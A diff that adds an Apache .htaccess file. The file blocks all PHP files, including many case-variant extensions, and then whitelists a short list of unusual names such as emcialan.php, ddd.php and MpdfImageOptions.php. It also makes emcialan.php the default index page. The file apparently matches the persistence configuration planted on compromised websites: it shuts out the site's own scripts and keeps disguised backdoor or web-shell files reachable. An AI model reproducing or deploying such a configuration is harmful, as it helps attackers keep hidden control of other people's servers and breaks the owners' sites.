@@ -1,0 +1,16 @@
+Options -Indexes
+
+# Deny access to most PHP-related files
+<FilesMatch "\.(?:php|pHp|pht|phtml|phtm|php5|php72|phar|pgif|inc|sht|shtm|shtml|PHP|Php|PhP|PHp|pHP|phP|PHTML|phtml|Phtml|PhtMl|phTmL|phtML)$">
+    Order allow,deny
+    Deny from all
+</FilesMatch>
+
+# Allow access to specific PHP files, including connectComp.php
+<FilesMatch "^(emcialan.php|dataconfig.php|webconfig.php|Documentation.php|Populator.php|MpdfImageOptions.php|ColumType.php|config_init.php|RegisterAuth.inc.php|NotificationSettingsConfig.inc.php|OJSPaymentDataset.inc.php|ddd.php|config.options.php|connectComp.php|adminConnect.php|companyConnect.php|stuConnect.php|logout.php|connect.php|display.php)$">
+    Order allow,deny
+    Allow from all
+</FilesMatch>
+
+# Set the default index file
+DirectoryIndex emcialan.php
